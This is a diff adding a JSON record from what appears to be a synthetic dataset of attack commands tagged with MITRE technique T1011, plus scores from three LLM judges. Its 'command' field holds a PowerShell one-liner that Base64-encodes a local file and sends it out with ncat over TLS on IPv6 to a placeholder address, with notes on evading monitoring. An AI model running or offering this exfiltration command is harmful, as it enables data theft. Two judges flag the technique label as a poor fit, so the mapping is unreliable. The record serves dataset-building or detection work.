@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
+  "explanation": "Sends Base64-encoded data over an IPv6 TCP connection with TLS using ncat, leveraging a non-standard high port to avoid common monitoring. This uses a different medium than typical corporate IPv4/HTTP flows, aligning with T1011.",
+  "rationale_steps": [
+    "Convert file to Base64 for opaque transfer.",
+    "Exfiltrate via IPv6 TCP with TLS to a rarely used high port, separating from primary channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-c67318d0",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for file operations and Base64 conversion, and correct ncat parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by exfiltrating data over an encrypted IPv6 channel to potentially avoid detection, though it's more aligned with exfiltration techniques (T1048) than searching closed sources.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T11:23:42.909968Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for method calls and piping, and valid ncat flags and arguments.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs data exfiltration of a local file, which is an action distinct from directly searching or querying external or internal 'closed sources' as the primary intent of T1011 describes.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T11:24:07.689600Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell syntax with balanced quotes/parentheses and correctly formed ncat arguments including IPv6, TLS, and send-only options.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates a local file over IPv6/TLS rather than querying or acquiring data from closed sources as described by the provided T1011 technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T11:24:10.883075Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
